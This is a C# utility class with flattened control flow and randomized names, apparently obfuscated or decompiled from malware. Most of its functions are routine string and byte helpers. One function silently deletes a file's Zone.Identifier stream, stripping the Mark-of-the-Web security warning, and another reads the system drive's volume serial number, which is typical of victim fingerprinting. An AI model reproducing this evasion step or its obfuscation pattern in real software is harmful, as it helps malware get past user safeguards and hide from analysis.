using System;
using System.Globalization;
using System.IO;
using System.Text;
using System.Text.RegularExpressions;
using ppkr;

namespace q9Ep;

public static class b4v
{
	public static byte[] H4VWdV77v(string iduiK)
	{
		int num = 0;
		int num2 = default;
		byte[] array = default;
		string s = default;
		do
		{
			if (num == 2)
			{
				num2 = 0;
				num = 3;
			}
			if (num == 6)
			{
				num2++;
				num = 7;
			}
			if (num != 3)
			{
				if (num == 1)
				{
					array = new byte[iduiK.Length / 2];
					num = 2;
				}
				if (num != 7)
				{
					goto IL_00d9;
				}
			}
			if (num2 > array.Length - 1)
			{
				num = 8;
				goto IL_00d9;
			}
			goto IL_0120;
			IL_0120:
			s = iduiK.Substring(num2 * 2, 2);
			num = 5;
			goto IL_0145;
			IL_0145:
			if (num == 0)
			{
				num = 1;
			}
			continue;
			IL_00d9:
			if (num == 5)
			{
				array[num2] = byte.Parse(s, NumberStyles.HexNumber, CultureInfo.InvariantCulture);
				num = 6;
			}
			if (num == 4)
			{
				goto IL_0120;
			}
			goto IL_0145;
		}
		while (num != 8);
		return array;
	}

	public static void _4zYQaqlZ<T>(ref T[] _6frhMOdt, int whkwOId)
	{
		int num = 0;
		int upperBound = default;
		int lowerBound = default;
		T[] array = default;
		int num2 = default;
		while (true)
		{
			if (num == 5)
			{
				if (whkwOId <= upperBound)
				{
					goto IL_0090;
				}
				num = 6;
			}
			if (num == 4)
			{
				if (whkwOId < lowerBound)
				{
					goto IL_00c3;
				}
				num = 5;
			}
			if (num == 10)
			{
				_6frhMOdt = array;
				num = 11;
			}
			if (num == 7)
			{
				goto IL_0090;
			}
			goto IL_00b2;
			IL_0090:
			array = new T[num2 - 1 + 1];
			num = 8;
			goto IL_00b2;
			IL_00c3:
			throw new ArgumentOutOfRangeException("");
			IL_00b2:
			if (num != 6)
			{
				if (num == 2)
				{
					lowerBound = _6frhMOdt.GetLowerBound(0);
					num = 3;
				}
				if (num == 1)
				{
					upperBound = _6frhMOdt.GetUpperBound(0);
					num = 2;
				}
				if (num == 9)
				{
					Array.Copy(_6frhMOdt, whkwOId + 1, array, whkwOId, upperBound - whkwOId);
					num = 10;
				}
				if (num == 3)
				{
					num2 = upperBound - lowerBound;
					num = 4;
				}
				if (num == 8)
				{
					Array.Copy(_6frhMOdt, 0, array, 0, whkwOId);
					num = 9;
				}
				if (num == 0)
				{
					num = 1;
				}
				if (num == 11)
				{
					break;
				}
				continue;
			}
			goto IL_00c3;
		}
	}

	public static void Wgg(string vRIDMUvlQb)
	{
		int num = 0;
		do
		{
			if (num == 0)
			{
				num = 1;
			}
		}
		while (num != 1);
		try
		{
			if (File.Exists(vRIDMUvlQb))
			{
				gVe3wBP.DeleteFile(vRIDMUvlQb + ":Zone.Identifier");
			}
		}
		catch
		{
		}
	}

	public static string _6thzQ()
	{
		int num = 0;
		do
		{
			if (num == 0)
			{
				num = 1;
			}
		}
		while (num != 1);
		try
		{
			gVe3wBP.GetVolumeInformation(Environment.GetEnvironmentVariable("SystemDrive") + "\\", null, 0, out var volumeSerialNumber, out var _, out var _, null, 0);
			return volumeSerialNumber.ToString("X");
		}
		catch
		{
			return null;
		}
	}

	public static string jCFtRv(string CHkPxUTF, string vKNieA4rIM, string OoDrSM, int wdbHefgAE)
	{
		int num = 0;
		do
		{
			if (num == 0)
			{
				num = 1;
			}
		}
		while (num != 1);
		try
		{
			string input = Regex.Split(CHkPxUTF, vKNieA4rIM)[wdbHefgAE + 1];
			return Regex.Split(input, OoDrSM)[0];
		}
		catch
		{
			return "";
		}
	}

	public static string[] gy6HND7Xm(this string _5jIXlFaXY, string _36k)
	{
		int num = 0;
		do
		{
			if (num == 0)
			{
				num = 1;
			}
		}
		while (num != 1);
		return _5jIXlFaXY.Split(new string[1] { _36k }, StringSplitOptions.None);
	}

	public static string glbopsCe(byte[] KLTQNAkFTqf)
	{
		int num = 0;
		StringBuilder stringBuilder = default;
		byte[] array = default;
		int num2 = default;
		byte b = default;
		while (true)
		{
			if (num == 8)
			{
				goto IL_001f;
			}
			goto IL_0037;
			IL_0037:
			if (num == 5)
			{
				goto IL_0048;
			}
			goto IL_005e;
			IL_005e:
			if (num == 4)
			{
				goto IL_001f;
			}
			if (num == 1)
			{
				stringBuilder = new StringBuilder();
				num = 2;
			}
			if (num == 2)
			{
				array = KLTQNAkFTqf;
				num = 3;
			}
			if (num == 7)
			{
				num2++;
				num = 8;
			}
			if (num == 6)
			{
				stringBuilder.AppendFormat("{0:X2}", b);
				num = 7;
			}
			if (num == 3)
			{
				num2 = 0;
				num = 4;
			}
			if (num == 0)
			{
				num = 1;
			}
			if (num == 9)
			{
				break;
			}
			continue;
			IL_001f:
			if (num2 >= array.Length)
			{
				num = 9;
				goto IL_0037;
			}
			goto IL_0048;
			IL_0048:
			b = array[num2];
			num = 6;
			goto IL_005e;
		}
		return stringBuilder.ToString();
	}

	public static byte[] NVDfZEIm9(byte[] jOSkmlSr3p, byte[] n7MRzN)
	{
		int num = 0;
		do
		{
			if (num == 0)
			{
				num = 1;
			}
		}
		while (num != 1);
		try
		{
			byte[] array = new byte[jOSkmlSr3p.Length + n7MRzN.Length - 1 + 1];
			Array.Copy(jOSkmlSr3p, array, jOSkmlSr3p.Length);
			Array.Copy(n7MRzN, 0, array, jOSkmlSr3p.Length, n7MRzN.Length);
			return array;
		}
		catch
		{
			return null;
		}
	}

	public static string x8jPE1(string QXJQn, string _16UlF7mY8xm, string _0UjY1Nj0vy)
	{
		int num = 0;
		do
		{
			if (num == 0)
			{
				num = 1;
			}
		}
		while (num != 1);
		return QXJQn.Split(new string[1] { _16UlF7mY8xm }, StringSplitOptions.None)[1].Split(new string[1] { _0UjY1Nj0vy }, StringSplitOptions.None)[0];
	}
}
